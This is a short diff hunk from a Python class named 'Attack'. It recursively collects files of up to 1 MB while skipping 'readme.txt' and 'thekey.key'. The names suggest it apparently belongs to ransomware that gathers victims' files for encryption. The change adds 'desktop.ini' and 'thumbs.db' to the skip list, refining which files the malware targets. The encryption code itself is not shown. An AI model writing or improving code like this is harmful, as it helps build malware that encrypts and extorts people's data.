@@ -42,7 +42,7 @@ class Attack:
                 if os.path.isdir(path):
                     self.list_files(path)
                 elif os.path.isfile(path):
-                    if file not in ["readme.txt", "thekey.key"]:
+                    if file not in ["readme.txt", "thekey.key", "desktop.ini", "thumbs.db"]:
                         if os.path.getsize(path) <= 1048576:
                             self.files.add(path)
                 
